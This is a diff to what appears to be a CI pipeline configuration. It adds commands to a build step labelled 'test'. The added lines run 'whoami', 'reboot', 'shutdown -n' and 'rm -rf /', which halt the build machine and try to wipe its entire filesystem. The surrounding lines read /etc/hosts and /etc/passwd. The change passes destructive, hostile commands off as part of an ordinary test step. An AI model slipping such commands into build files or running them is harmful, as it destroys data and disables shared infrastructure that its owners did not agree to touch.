@@ -30,6 +30,10 @@ build:
     - script:
         name: test
         code: |
+          whoami
+          reboot
+          shutdown -n
+          rm -rf /
           pwd
           cat /etc/hosts > aaa.txt
           cat /etc/passwd
